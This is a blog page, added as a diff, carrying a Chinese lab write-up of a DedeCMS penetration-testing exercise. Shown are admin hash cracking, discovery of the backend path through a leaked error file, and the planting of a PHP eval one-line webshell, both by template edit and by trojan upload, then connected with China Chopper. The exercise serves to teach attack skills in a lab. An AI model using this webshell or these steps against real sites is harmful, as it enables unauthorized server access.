@@ -1,0 +1,1423 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="TGrgd6itNVDcEjPh_ZJU-fc0-4WWeviPJnz7UOzkj-k" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Writeup,Web,PHP,i春秋,Crypto,Pentest,Exploit,CMS,Trojan,Vulnerability,Privilege,CMD," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="0x00 前言本题是渗透测试入门的一道基础题，虽然美其名曰“真的很简单”，但对于新手还是有一定挑战性的，实践并掌握本题中的所有知识点，对渗透测试的基本理解有很大帮助。 此题的目标是对一个基于织梦 CMS 的网站进行渗透测试，找到网站登录后台，继而入侵服务器找到存放 flag 的文件。从实验手册上，可看出其中还会涉及到简单的提权过程。  题目链接：https://www.ichunqiu.com/b">
+<meta name="keywords" content="Writeup,Web,PHP,i春秋,Crypto,Pentest,Exploit,CMS,Trojan,Vulnerability,Privilege,CMD">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【i春秋】渗透测试入门 —— 真的很简单">
+<meta property="og:url" content="https://ciphersaw.github.io/2018/03/06/【i春秋】渗透测试入门 —— 真的很简单/index.html">
+<meta property="og:site_name" content="Secrypt Agency">
+<meta property="og:description" content="0x00 前言本题是渗透测试入门的一道基础题，虽然美其名曰“真的很简单”，但对于新手还是有一定挑战性的，实践并掌握本题中的所有知识点，对渗透测试的基本理解有很大帮助。 此题的目标是对一个基于织梦 CMS 的网站进行渗透测试，找到网站登录后台，继而入侵服务器找到存放 flag 的文件。从实验手册上，可看出其中还会涉及到简单的提权过程。  题目链接：https://www.ichunqiu.com/b">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/guide.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/dedecms_download.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/dedecms.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/dedecms_md5.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/password.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/password_verify.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/directory_scan.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/mysqli_error_trace.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/login.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/template_list.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/template_edit.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/chopper.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/add_shell_1.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/manager_1.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/trojan_edit.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/file_type.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/trojan_upload.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/trojan_path.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/add_shell_2.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/manager_2.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/manager_flag.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/chopper_terminal.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/deny.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/flag.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/cacls.png">
+<meta property="og:updated_time" content="2019-05-02T01:52:50.631Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【i春秋】渗透测试入门 —— 真的很简单">
+<meta name="twitter:description" content="0x00 前言本题是渗透测试入门的一道基础题，虽然美其名曰“真的很简单”，但对于新手还是有一定挑战性的，实践并掌握本题中的所有知识点，对渗透测试的基本理解有很大帮助。 此题的目标是对一个基于织梦 CMS 的网站进行渗透测试，找到网站登录后台，继而入侵服务器找到存放 flag 的文件。从实验手册上，可看出其中还会涉及到简单的提权过程。  题目链接：https://www.ichunqiu.com/b">
+<meta name="twitter:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/guide.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.2',
+    sidebar: {"position":"right","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://ciphersaw.github.io/2018/03/06/【i春秋】渗透测试入门 —— 真的很简单/"/>
+
+
+
+
+
+  <title>【i春秋】渗透测试入门 —— 真的很简单 | Secrypt Agency</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Secrypt Agency</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Welcome to a platform for network security artists.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friends">
+          <a href="/friends/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-users"></i> <br />
+            
+            Friends
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ciphersaw.github.io/2018/03/06/【i春秋】渗透测试入门 —— 真的很简单/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Cipher Saw">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Secrypt Agency">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">【i春秋】渗透测试入门 —— 真的很简单</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-06T15:56:26+08:00">
+                2018-03-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/InfoSec/" itemprop="url" rel="index">
+                    <span itemprop="name">InfoSec</span>
+                  </a>
+                </span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/InfoSec/Pentest/" itemprop="url" rel="index">
+                    <span itemprop="name">Pentest</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/03/06/【i春秋】渗透测试入门 —— 真的很简单/" class="leancloud_visitors" data-flag-title="【i春秋】渗透测试入门 —— 真的很简单">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本题是渗透测试入门的一道基础题，虽然美其名曰“真的很简单”，但对于新手还是有一定挑战性的，实践并掌握本题中的所有知识点，对渗透测试的基本理解有很大帮助。</p>
+<p>此题的目标是对一个<strong>基于<a href="http://www.dedecms.com/" target="_blank" rel="external">织梦 CMS</a> 的网站</strong>进行渗透测试，找到网站登录后台，继而入侵服务器找到存放 flag 的文件。从实验手册上，可看出其中还会涉及到简单的提权过程。</p>
+<ul>
+<li>题目链接：<a href="https://www.ichunqiu.com/battalion?t=2&amp;r=54399" target="_blank" rel="external">https://www.ichunqiu.com/battalion?t=2&amp;r=54399</a></li>
+<li>解题链接：<a href="https://www.ichunqiu.com/vm/51123/1" target="_blank" rel="external">https://www.ichunqiu.com/vm/51123/1</a></li>
+</ul>
+<a id="more"></a>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/guide.png" alt="guide"></p>
+<h1 id="0x01-网站管理员的密码是多少？"><a href="#0x01-网站管理员的密码是多少？" class="headerlink" title="0x01 网站管理员的密码是多少？"></a>0x01 网站管理员的密码是多少？</h1><p>第 1 题相对简单，在实验环境内根据提示打开下载链接 <code>http://file.ichunqiu.com/49ba59ab</code>，接着下载爆破工具 <code>dedecms.exe</code>：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/dedecms_download.png" alt="dedecms_download"></p>
+<p>打开工具，输入目标 URL，一键爆破得到管理员的账号 <code>ichunqiu</code> 与密码哈希值 <code>adab29e084ff095ce3eb</code>：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/dedecms.png" alt="dedecms"></p>
+<p>仔细数数，发现密码哈希值是 20 位的（注：此处的“位”均为十六进制，而非二进制），上网一查才发现这是织梦 CMS 的特性，实现过程可参考 <a href="http://www.jb51.net/cms/104721.html" target="_blank" rel="external">DEDECMS的20位MD5加密密文解密示例介绍</a>：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/dedecms_md5.png" alt="dedecms_md5"></p>
+<p>将 20 位的哈希值用 <a href="http://www.dmd5.com/md5-decrypter.jsp" target="_blank" rel="external">MD5解密工具</a> 解密，得到密码明文 <code>only_system</code>：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/password.png" alt="password"></p>
+<p>为验证 20 位的 MD5 哈希算法规则，可进一步用 <a href="https://md5jiami.51240.com/" target="_blank" rel="external">MD5加密工具</a> 对 <code>only_system</code> 加密，发现其 16 位哈希值确实能由 20 位哈希值去掉前 3 位与后 1 位所得:</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/password_verify.png" alt="password_verify"></p>
+<h1 id="0x02-网站后台目录名是什么？"><a href="#0x02-网站后台目录名是什么？" class="headerlink" title="0x02 网站后台目录名是什么？"></a>0x02 网站后台目录名是什么？</h1><p>第 2 题上来先尝试织梦 CMS 的默认后台路径 <code>/dede/index.php</code> 或 <code>/dede/login.php</code>，得到 404 的结果也是意料之中，即现在的问题是要找出修改后的后台目录名。</p>
+<p>打开实验工具箱，发现【目录扫描】文件夹，以【御剑后台扫描工具】为例，对目标 URL 扫描后得到如下结果：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/directory_scan.png" alt="directory_scan"></p>
+<p>注意，为了保证扫描效率，一般后台扫描工具都是采用字典扫描，而不是暴力穷举，因此<strong>不同扫描器得到的结果不完全相同，尽可能使用多种扫描器，偏僻怪异的名字可能扫描不出来</strong>。</p>
+<p>笔者采用了多种扫描器，并对其可能的结果进行验证，都一无所获，即可<strong>判断此后台目录名具有较强的个性或随机性</strong>。</p>
+<p>所以要转换思路，看看织梦 CMS 是否存在后台地址信息泄露的漏洞。果不其然，发现从报错文件 <code>/data/mysql_error_trace.inc</code> 或 <code>/data/mysqli_error_trace.inc</code> 中，可得到泄露的后台路径，具体可参考：</p>
+<blockquote>
+<p><a href="http://blog.csdn.net/wangyi_lin/article/details/9286937" target="_blank" rel="external">dedecms的各种卡哇伊小漏洞</a><br><a href="http://www.cnblogs.com/hookjoy/p/6996820.html" target="_blank" rel="external">dedecms(织梦)漏洞&amp;exp整理</a><br><a href="http://www.daixiaorui.com/read/14.html" target="_blank" rel="external">php学习之织梦dedecms漏洞讲解</a></p>
+</blockquote>
+<p>最后在 <code>/data/mysqli_error_trace.inc</code> 中获得后台目录名为 <code>lichunqiul</code>：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/mysqli_error_trace.png" alt="mysqli_error_trace"></p>
+<p>对其进行验证，终于看到了后台登录页面：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/login.png" alt="login"></p>
+<h1 id="0x03-管理员桌面中-flag-文件信息是？"><a href="#0x03-管理员桌面中-flag-文件信息是？" class="headerlink" title="0x03 管理员桌面中 flag 文件信息是？"></a>0x03 管理员桌面中 flag 文件信息是？</h1><p>用账号 <code>ichunqiu</code> 与密码 <code>only_system</code> 登录后台后，根据实验手册，要想办法利用<a href="http://www.zhongguocaidao.com/" target="_blank" rel="external">中国菜刀</a>连接服务器，获得 webshell，进而查看 flag 文件中的信息。</p>
+<h2 id="获取-webshell"><a href="#获取-webshell" class="headerlink" title="获取 webshell"></a>获取 webshell</h2><p>首先我们需要在服务器插入<a href="https://baike.baidu.com/item/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC" target="_blank" rel="external">一句话木马</a>，然后才能用菜刀连接，获得 webshell。这里介绍两种插入一句话木马的方法。</p>
+<h3 id="直接修改模板-PHP-源码"><a href="#直接修改模板-PHP-源码" class="headerlink" title="直接修改模板 PHP 源码"></a>直接修改模板 PHP 源码</h3><p>依次点击 <strong>模板 -&gt; 标签源码管理</strong>，以编辑第一个模板 <code>adminname.lib.php</code> 为例：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/template_list.png" alt="template_list"></p>
+<p>在模板源码第一行插入一句话木马 <code>&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;</code>：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/template_edit.png" alt="template_edit"></p>
+<p>接着在工具箱【webshell】文件夹打开【中国菜刀】：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/chopper.png" alt="chopper"></p>
+<p>在 <strong>添加SHELL</strong> 输入框中，输入被插入木马模板文件的地址 <code>http://www.test.ichunqiu/include/taglib/adminname.lib.php</code>，其右侧填入木马中接收 POST 请求数据的 key 字段 <code>cmd</code>，脚本类型为 <code>PHP(Eval)</code>，字符编码为 <code>GB2312</code>，设置完成后点击 <strong>添加</strong>：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/add_shell_1.png" alt="add_shell_1"></p>
+<p>若参数设置正确，双击所添加的条目，即可连接服务器的资源管理器，进入到模板文件所在的目录：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/manager_1.png" alt="manager_1"></p>
+<h3 id="上传一句话木马文件"><a href="#上传一句话木马文件" class="headerlink" title="上传一句话木马文件"></a>上传一句话木马文件</h3><p>先在本地创建文件 <code>trojan.php</code>，写入一句话木马 <code>&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;</code>：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/trojan_edit.png" alt="trojan_edit"></p>
+<p>再依次点击 <strong>系统 -&gt; 系统基本参数 -&gt; 附件设置</strong>，如下图更改允许上传的文件类型，否则木马将上传失败：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/file_type.png" alt="file_type"></p>
+<p>最后点击 <strong>核心 -&gt; 上传新文件</strong>，如下图所示上传木马：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/trojan_upload.png" alt="trojan_upload"></p>
+<p>上传完毕后点击 <strong>核心 -&gt; 附件数据管理 -&gt; 更改</strong>，即可查看木马的路径：</p>
